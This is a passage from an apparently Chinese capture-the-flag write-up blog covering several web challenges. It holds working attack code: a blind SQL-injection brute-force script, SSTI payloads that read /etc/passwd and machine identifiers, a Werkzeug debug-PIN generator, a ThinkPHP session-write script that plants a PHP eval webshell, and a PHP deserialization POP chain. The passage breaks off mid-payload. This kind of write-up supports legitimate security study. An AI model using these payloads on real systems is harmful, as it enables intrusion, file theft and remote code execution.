href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目是一个大大的输入框，多次尝试发现输入<code>1</code>的时候回显<code>Hello Nu1L</code>，输入<code>0</code>的时候回显<code>hello</code>，后来测试了多个关键字，发现<code>union select</code>单用的时候没问题，联合起来使用怎么都绕不过，<code>or</code>、<code>and</code>也被ban了，但是<code>&amp;&amp;</code>没被ban，这里有搞头，然后测了一下，语句为<code>true</code>回显也是<code>hello Nu1L</code>，就从这里下手了。<br>后来又发现<code>information_schema</code>也被ban了，这时候想到了之前一个题里讲过的：利用mysql系统库<code>sys.schema_table_statistics_with_buffer</code>或者<code>sys.schema_auto_increment_columns</code>获取到了表名，但是因为<code>union select</code>被ban，无列名注入也没法进行，这时候就用到了前面说的学到的新姿势了：利用<code>id=2-(select (select 1,{0})&gt;(select * from f1ag_1s_h3r3_hhhhh limit 1))&quot;</code>这样的语句使进行两列的对比，从而爆破出第二列(flag列)的内容。脚本如下：</p><h3 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://ab8f8551f4dc43a4bc43854950cb1088190a260570ee455c.changame.ichunqiu.com/index.php'</span></span><br><span class="line">headers = &#123;<span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>&#125;</span><br><span class="line"><span class="comment"># payload = "1 &amp;&amp; mid((select database()),1,&#123;0&#125;)='&#123;1&#125;'"</span></span><br><span class="line"><span class="comment"># payload = "1 &amp;&amp; mid((select table_name from sys.schema_table_statistics_with_buffer where table_schema='ctf' limit 1 offset 1),1,&#123;0&#125;)='&#123;1&#125;'"</span></span><br><span class="line"><span class="comment"># payload = "1 &amp;&amp; mid((select column_name from sys.schema_auto_increment_columns where table_name='f1ag_1s_h3r3_hhhhh' limit 1),1,&#123;0&#125;)='&#123;1&#125;'" #不可用，需要进行无列名查询</span></span><br><span class="line"><span class="comment"># payload = "1 &amp;&amp; mid((select * from f1ag_1s_h3r3_hhhhh limit 1),1,&#123;0&#125;)='&#123;1&#125;'" #不可用，因为有两列</span></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line">letter = <span class="string">'0123456789bcdehijkmnopqrstuvwxyz_-&#123;&#125;'</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">for i in range(1, 80):</span></span><br><span class="line"><span class="string">    for n in letter:</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        data = &#123;</span></span><br><span class="line"><span class="string">            "id": payload.format(i, database + n),</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        req = requests.post(url, data=data,headers=headers)</span></span><br><span class="line"><span class="string">        # print(req.text.encode('gbk').decode(req.apparent_encoding))</span></span><br><span class="line"><span class="string">        if "Hello Nu1L" in req.text:</span></span><br><span class="line"><span class="string">            print(n)</span></span><br><span class="line"><span class="string">            flag += n</span></span><br><span class="line"><span class="string">            print(database)</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">126</span>):</span><br><span class="line">                a = chr(i).encode().hex()</span><br><span class="line">                payload = <span class="string">"id=2-(select (select 1,0x%s)&gt;(select * from f1ag_1s_h3r3_hhhhh limit 1))"</span>%(flag.encode().hex()+a) <span class="comment">#创建两列数据去比较</span></span><br><span class="line">                <span class="comment">#print("Test:"+chr(i))</span></span><br><span class="line">                html = requests.post(url=url,data=payload,headers=headers)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">"Hello Nu1L"</span> <span class="keyword">in</span> html.text:</span><br><span class="line">                        flag += chr(i<span class="number">-1</span>)</span><br><span class="line">                        print(<span class="string">"Find:"</span>+flag)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> chr(i) == <span class="string">'&#125;'</span>:</span><br><span class="line">                flag +=<span class="string">'&#125;'</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="Web-FlaskApp"><a href="#Web-FlaskApp" class="headerlink" title="Web-FlaskApp"></a>Web-FlaskApp</h2><p>考察SSTI</p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目发现是一个base64加密解密网站，直接考虑SSTI了。并且这个题跟另外一个利用Flask写的加密的题很像，便参考了那个题的<a href="https://www.anquanke.com/post/id/197602?display=mobile">解题思路</a>：在开启DEBUG模式的情况下进行模板注入。<br>首先测试一下SSTI是否能用：先在加密页面对<code></code>加密一下，然后到解密页解密，页面回显如下：<br><img src="http://www.ggb0n.cool/images/ichunqiu8.png" alt=""><br>由此得知，确实是SSTI，同时还看到了开启了DEBUG模式。<br>那就利用那道题的解题思路去做吧。</p><h3 id="解题-5"><a href="#解题-5" class="headerlink" title="解题"></a>解题</h3><p>参考前面的链接我们知道，这道题可以通过计算出<code>PIN</code>来登录控制台，然后在控制台进行操作拿flag。但是生成<code>PIN</code>的脚本需要知道<code>username</code>(这个需要我们自己去找)、<code>modname</code>(一般是<code>flask.app</code>)、第三个值<code>getattr(app, &quot;__name__&quot;, app.__class__.__name__)</code>(一般是<code>Flask</code>)、第四个值<code>getattr(mod, &quot;__file__&quot;, None)</code>(在报错页面可以看到题目的环境)、第五个是<code>str(uuid.getnode())</code>的值，最后是机器码。<br>报错页面回显如下：<br><img src="http://www.ggb0n.cool/images/ichunqiu9.png" alt=""></p><h4 id="获取username"><a href="#获取username" class="headerlink" title="获取username"></a>获取username</h4><p>可以在<code>/etc/passwd</code>中读取到用户名，这里由于题目环境是Python3的，因此读文件需要用如下payload：</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ''.<span class="strong">__class__</span>.<span class="strong">__mro__</span>[<span class="string">1</span>].<span class="strong">__subclasses__</span>()[<span class="string">103</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">'open'</span>](<span class="link">'/etc/passwd'</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure><p>如果环境是Python2，payload可以构造为：</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ''.<span class="strong">__class__</span>.<span class="strong">__mro__</span>[<span class="string">2</span>].<span class="strong">__subclasses__</span>()[<span class="string">40</span>](<span class="link">'/etc/passwd'</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure><p>跟前面的操作一样，先编码，再去解码引发SSTI，回显如下：<br><img src="http://www.ggb0n.cool/images/ichunqiu13.png" alt=""><br>我们看到可以用户名<code>flaskweb</code>，应该就是它了。</p><p><code>modename</code>以及第三个、第四个已经知道了，直接去找<code>str(uuid.getnode())</code>的值。</p><h4 id="获取str-uuid-getnode"><a href="#获取str-uuid-getnode" class="headerlink" title="获取str(uuid.getnode())"></a>获取str(uuid.getnode())</h4><p>构造payload：</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ''.<span class="strong">__class__</span>.<span class="strong">__mro__</span>[<span class="string">1</span>].<span class="strong">__subclasses__</span>()[<span class="string">103</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">'open'</span>](<span class="link">'/sys/class/net/eth0/address'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>按照同样的方法进行注入，得到回显如下：<br><img src="http://www.ggb0n.cool/images/ichunqiu14.png" alt=""><br>然后到<a href="https://tool.oschina.net/hexconvert/">进制转换网站</a>转换为十进制。</p><h4 id="获取机器码"><a href="#获取机器码" class="headerlink" title="获取机器码"></a>获取机器码</h4><p>构造payload：</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ''.<span class="strong">__class__</span>.<span class="strong">__mro__</span>[<span class="string">1</span>].<span class="strong">__subclasses__</span>()[<span class="string">103</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">'open'</span>](<span class="link">'/proc/self/cgroup'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>回显如下：<br><img src="http://www.ggb0n.cool/images/ichunqiu15.png" alt=""><br>第一项<code>/docker/</code>后面的字符串即为我们要找的机器码。<br>至此，拿到了生成<code>PIN</code>的所有的要素了，利用下面的脚本生成<code>PIN</code>：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">'flaskweb'</span><span class="comment"># username</span></span><br><span class="line">    <span class="string">'flask.app'</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">'Flask'</span>,<span class="comment"># getattr(app, '__name__', getattr(app.__class__, '__name__'))</span></span><br><span class="line">    <span class="string">'/usr/local/lib/python3.7/site-packages/flask/app.py'</span> <span class="comment"># getattr(mod, '__file__', None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">'2485377957890'</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">'3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320'</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b'cookiesalt'</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">'__wzd'</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b'pinsalt'</span>)</span><br><span class="line">    num = (<span class="string">'%09d'</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">'-'</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">'0'</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure><p>然后到题目的链接后面加上<code>/console</code>进入控制面板，输入PIN，获取权限：<br><img src="http://www.ggb0n.cool/images/ichunqiu16.png" alt=""><br>然后就可以随意输入读取文件拿flag了(注意列举文件的时候也可以直接列举根目录的<code>ls /</code>)：<br><img src="http://www.ggb0n.cool/images/ichunqiu17.png" alt=""><br><img src="http://www.ggb0n.cool/images/ichunqiu18.png" alt=""></p><h2 id="Web-easy-thinking"><a href="#Web-easy-thinking" class="headerlink" title="Web-easy_thinking"></a>Web-easy_thinking</h2><p>考察<code>ThinkPHP6.0</code>存在的通过<code>SESSION</code>写文件的漏洞，同时也考察了对<code>disable_functions</code>的绕过。<br>这一道题比赛的时候知道考察点是SESSION漏洞了，但是由于时间原因当时没有做出来，后来经smity师傅提示，结合getfly师傅的题解，对这道题加深了理解和学习。在BUU上复现了一下。</p><h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><p>由于环境是<code>ThinkPHP6.0</code>，网上查了一下，找到了相关的漏洞文章：<br><a href="https://blog.csdn.net/god_zzZ/article/details/104275241">https://blog.csdn.net/god_zzZ/article/details/104275241</a><br><a href="https://paper.seebug.org/1114/#_1">https://paper.seebug.org/1114/#_1</a><br>就是通过利用<code>SESSION</code>向服务器写入文件，从而拿到shell。</p><p>既然是通过SESSION写入文件，我们就需要找到存在SESSION写入的位置，在<code>Member</code>控制器中发现如下代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!session(<span class="string">'?UID'</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">'/home/member/login'</span>);            </span><br><span class="line">&#125;</span><br><span class="line">$data = input(<span class="string">"post."</span>);</span><br><span class="line">$record = session(<span class="string">"Record"</span>);</span><br><span class="line"><span class="keyword">if</span> (!session(<span class="string">"Record"</span>))</span><br><span class="line">&#123;</span><br><span class="line">    session(<span class="string">"Record"</span>,$data[<span class="string">"key"</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，在<code>search</code>方法中可以进行任意SESSION写入，在这个地方我们就可以写入构造好的内容来生成shell，但是首先就需要满足第一个判断，即需要一个现有的SESSION文件并且包含<code>UID</code>字段，下面就需要找到将<code>UID</code>写入SESSION的地方。<br>在<code>Member</code>控制器的<code>login</code>方法中找到如下代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ($userId)&#123;</span><br><span class="line">    session(<span class="string">"UID"</span>,$userId);</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">"/home/member/index"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将<code>UID</code>写入SESSION的操作是在判断用户名和密码正确之后的，那么我们就需要先注册一个合法的用户进行登录。</p><p>捋一下整个的思路：</p><ul><li>1、注册一个合法账户</li><li>2、利用注册的账户登录时更改<code>SESSION</code>字段的值为<code>xxx.php</code>，并且刚好是32个字符</li><li>3、利用相同的<code>SESSION</code>在搜索的时候写入一句话</li><li>4、在<code>/runtime/session</code>文件夹下测试一句话，注意是<code>sess_</code>开头的</li></ul><p>参考getfly师傅的脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url_reg = <span class="string">'http://ebeb2d63-1ffd-4543-bf4d-07d0a35b9931.node3.buuoj.cn/home/member/register'</span></span><br><span class="line">url_log = <span class="string">'http://ebeb2d63-1ffd-4543-bf4d-07d0a35b9931.node3.buuoj.cn/home/member/login'</span></span><br><span class="line">url_sea = <span class="string">'http://ebeb2d63-1ffd-4543-bf4d-07d0a35b9931.node3.buuoj.cn/home/member/search'</span></span><br><span class="line">headers = &#123; <span class="string">'Cookie'</span>:<span class="string">'PHPSESSID=1234567890123456789012345678.php'</span> &#125;</span><br><span class="line">data1 = &#123;<span class="string">'username'</span>:<span class="string">'ggb0n'</span>, <span class="string">'password'</span>:<span class="string">'123456'</span>&#125;</span><br><span class="line">data2 = &#123;<span class="string">'key'</span>:<span class="string">'&lt;?php @eval($_POST["x"]);echo "not flag"; ?&gt;'</span>&#125;</span><br><span class="line">s1 = requests.post(url_reg, data1)</span><br><span class="line">s2 = requests.post(url_log, data1, headers=headers)</span><br><span class="line">s3 = requests.post(url_sea, data2, headers=headers)</span><br><span class="line">test = <span class="string">'http://ebeb2d63-1ffd-4543-bf4d-07d0a35b9931.node3.buuoj.cn/runtime/session/sess_1234567890123456789012345678.php'</span></span><br><span class="line">s = requests.get(test).text</span><br><span class="line"><span class="keyword">if</span> <span class="string">'not flag'</span> <span class="keyword">in</span> s:</span><br><span class="line">    print(<span class="string">'success'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'failed'</span>)</span><br></pre></td></tr></table></figure><p>蚁剑连接小马之后在终端运行<code>/readflag</code>是没用的，利用<code>phpinfo()</code>发现是因为<code>disable_functions</code>把<code>system</code>给ban掉了：<br><img src="http://www.ggb0n.cool/images/ichunqiu28.png" alt=""><br>那就需要绕过限制，smity师傅比赛的时候就提醒需要用<code>php_gc_uaf.php</code>来绕过<code>disable_functhions</code>，一些绕过方法参考<a href="https://blog.csdn.net/jia3643/article/details/104200164">这里</a>。<br>把<code>php_gc_uaf.php</code>传到一个<code>777</code>权限的文件夹下，然后在浏览器端访问该文件即可拿到flag。</p><p>【补充】这个<a href="https://www.exploit-db.com/exploits/48072">exp</a>不用777权限的文件夹就能执行，web目录即可。高校战“疫”中的PHP-UAF就是用的这个。</p><h2 id="babyPHP"><a href="#babyPHP" class="headerlink" title="babyPHP"></a>babyPHP</h2><p>考察反序列化逃逸漏洞，这个之前在BUU上刷了<a href="http://47.107.152.5/2020/02/07/BUUCTF-web%E5%88%B7%E9%A2%98%E2%85%A0/#0CTF-2016-piapiapia">一道类似的题目</a>，不过更加复杂，比赛的时候没做出来，看了WP记录学习一下。</p><h3 id="题目分析-4"><a href="#题目分析-4" class="headerlink" title="题目分析"></a>题目分析</h3><p>扫描后台可以发现存在源码<code>www.zip</code>，下载后是四个php文件，我们主要分析与拿flag相关的代码。<br>首先从<code>update.php</code>中发现：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>]===<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现，登陆成功之后就可以拿到flag了。</p><p>然后审计关键文件<code>lib.php</code>，在其中发现如下代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($parm)</span></span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">'union'</span>,<span class="string">'regexp'</span>,<span class="string">'load'</span>,<span class="string">'into'</span>,<span class="string">'flag'</span>,<span class="string">'file'</span>,<span class="string">'insert'</span>,<span class="string">"'"</span>,<span class="string">'\\'</span>,<span class="string">"*"</span>,<span class="string">"alter"</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">'hacker'</span>,$parm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到这里，就想到了之前在BUU上刷的<strong>[0CTF 2016]piapiapia</strong>，那道题考察的就是反序列化溢出漏洞，这也就是分析的关键了。<br>再往下看，在<code>UpdateHelper</code>类中有一个反序列化点：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $newinfo;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($newInfo,$sql)</span></span>&#123;</span><br><span class="line">        $newInfo=unserialize($newInfo);</span><br><span class="line">        $upDate=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是从代码中可以看到，此处用户可控的只有<code>Info</code>类中的两个属性<code>age</code>、<code>nickname</code>，不能完全控制序列化数据，无法注入对象。<br>跟进<code>User</code>类中的反序列化点：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $Info=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">    $age=$Info-&gt;age;</span><br><span class="line">    $nickname=$Info-&gt;nickname;</span><br><span class="line">    $updateAction=<span class="keyword">new</span> UpdateHelper($_SESSION[<span class="string">'id'</span>],$Info,<span class="string">"update user SET age=$age,nickname=$nickname where id="</span>.$_SESSION[<span class="string">'id'</span>]);</span><br><span class="line">    <span class="comment">//这个功能还没有写完 先占坑</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现，反序列化的是<code>getNewinfo()</code>方法获取的内容，再来看一下<code>getNewinfo()</code>：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $age=$_POST[<span class="string">'age'</span>];</span><br><span class="line">    $nickname=$_POST[<span class="string">'nickname'</span>];</span><br><span class="line">    <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，对<code>Info</code>类的内容序列化之后，会先经过前面提到的<code>safe()</code>函数处理，然后才进行反序列化。<br>这里就是构造反序列化逃逸的地方：通过写入黑名单中的字符\字符串，在经过<code>safe()</code>函数处理的时候会替换为<code>hacker</code>，从而改变了长度，但是序列化的字符串，每一个属性的内容长度都是固定的，从而就可以利用替换关系构造出逃逸，然后注入对象。</p><p>整理一下构造pop链的思路：</p><blockquote><p>利用<code>UpdateHelper</code>的<code>__destruct</code>触发<code>User</code>的<code>__toString</code>然后走到<code>Info</code>的<code>__call</code>方法，在<code>__call</code>中调用了<code>dbCtrl</code>类的<code>login</code>方法，通过控制查询语句，把<code>admin</code>账户的密码查出来。</p></blockquote><p>官方POC如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname=<span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($age,$nickname)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname=$nickname;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UpdateHelper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $newinfo;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname=<span class="string">"127.0.0.1"</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">"root"</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">"root"</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">"test"</span>;</span><br><span class="line">    <span class="keyword">public</span> $name=<span class="string">'admin'</span>;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">&#125;</span><br><span class="line">$d = <span class="keyword">new</span> dbCtrl();</span><br><span class="line">$d-&gt;token=<span class="string">'admin'</span>;</span><br><span class="line">$b = <span class="keyword">new</span> Info(<span class="string">''</span>,<span class="string">'1'</span>);</span><br><span class="line">$b-&gt;CtrlCase=$d;</span><br><span class="line">$a = <span class="keyword">new</span> user();</span><br><span class="line">$a-&gt;nickname=$b;</span><br><span class="line">$a-&gt;age=<span class="string">"select password,id from user where username=?"</span>;</span><br><span class="line">$c=<span class="keyword">new</span> UpdateHelper();</span><br><span class="line">$c-&gt;sql=$a;</span><br><span class="line"><span class="keyword">echo</span> serialize($c);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行结果如下</p><figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="string">O:</span><span class="number">12</span>:<span class="string">"UpdateHelper"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">2</span>:<span class="string">"id"</span>;N;<span class="string">s:</span><span class="number">7</span>:<span class="string">"newinfo"</span>;N;<span class="string">s:</span><span class="number">3</span>:<span class="string">"sql"</span>;<span class="string">O:</span><span class="number">4</span>:<span class="string">"User"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">2</span>:<span class="string">"id"</span>;N;<span class="string">s:</span><span class="number">3</span>:<span class="string">"age"</span>;<span class="string">s:</span><span class="number">45</span>:<span class="string">"select password,id from user where username=?"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"nickname"</span>;<span class="string">O:</span><span class="number">4</span>:<span class="string">"Info"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">3</span>:<span class="string">"age"</span>;<span class="string">s:</span><span class="number">0</span>:<span class="string">""</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"nickname"</span>;<span class="string">s:</span><span class="number">1</span>:<span class="string">"1"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"CtrlCase"</span>;<span class="string">O:</span><span class="number">6</span>:<span class="string">"dbCtrl"</span>:<span class="number">8</span>:&#123;<span class="string">s:</span><span class="number">8</span>:<span class="string">"hostname"</span>;<span class="string">s:</span><span class="number">9</span>:<span class="string">"127.0.0.1"</span>;<span class="string">s:</span><span class="number">6</span>:<span class="string">"dbuser"</span>;<span class="string">s:</span><span class="number">4</span>:<span class="string">"root"</span>;<span class="string">s:</span><span class="number">6</span>:<span class="string">"dbpass"</span>;<span class="string">s:</span><span class="number">4</span>:<span class="string">"root"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"database"</span>;<span class="string">s:</span><span class="number">4</span>:<span class="string">"test"</span>;<span class="string">s:</span><span class="number">4</span>:<span class="string">"name"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"admin"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"password"</span>;N;<span class="string">s:</span><span class="number">6</span>:<span class="string">"mysqli"</span>;N;<span class="string">s:</span><span class="number">5</span>:<span class="string">"token"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"admin"</span>;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>我们的目的是逃逸字符，因此需要保证payload进入之后能保证序列化字符串能够正常反序列化，正常的序列化字符串结构如下：</p><figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="string">O:</span><span class="number">4</span>:<span class="string">"Info"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">3</span>:<span class="string">"age"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"ggb0n"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"nickname"</span>;<span class="string">s:</span><span class="number">7</span>:<span class="string">"ggb0n"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"CtrlCase"</span>;N;&#125;</span><br></pre></td></tr></table></figure><p>其中的<code>age</code>和<code>nickname</code>是我们可控的，那么我们就可以把payload写入到<code>nickname</code>部分，然后通过将payload挤出去进行逃逸，由于属性是三个，所以我们在<code>nickname</code>中写入的payload前面加一个<code>CtrlCase</code>的属性，在最后加一个<code>}</code>，如此以来，反序列化的时候就会忽略后面的<code>CtrlCase</code>，初步构造payload如下：</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="string">";s:8:"</span>CtrlCase<span class="string">";O:12:"</span>UpdateHelpe<span class="string">r":3:&#123;s:2:"</span>id<span class="string">";N;s:7:"</span>newinfo<span class="string">";N;s:3:"</span>sql<span class="string">";O:4:"</span>Use<span class="string">r":3:&#123;s:2:"</span>id<span class="string">";N;s:3:"</span>age<span class="string">";s:45:"</span>select password,id from user where username=?<span class="string">";s:8:"</span>nickname<span class="string">";O:4:"</span>Info<span class="string">":3:&#123;s:3:"</span>age<span class="string">";s:0:"</span><span class="string">";s:8:"</span>nickname<span class="string">";s:1:"</span><span class="number">1</span><span class="string">";s:8:"</span>CtrlCase<span class="string">";O:6:"</span>dbCtrl<span class="string">":8:&#123;s:8:"</span>hostname<span class="string">";s:9:"</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="string">";s:6:"</span>dbuse<span class="string">r";s:4:"</span>root<span class="string">";s:6:"</span>dbpass<span class="string">";s:4:"</span>root<span class="string">";s:8:"</span>database<span class="string">";s:4:"</span>test<span class="string">";s:4:"</span>name<span class="string">";s:5:"</span>admin<span class="string">";s:8:"</span>password<span class="string">";N;s:6:"</span>mysqli<span 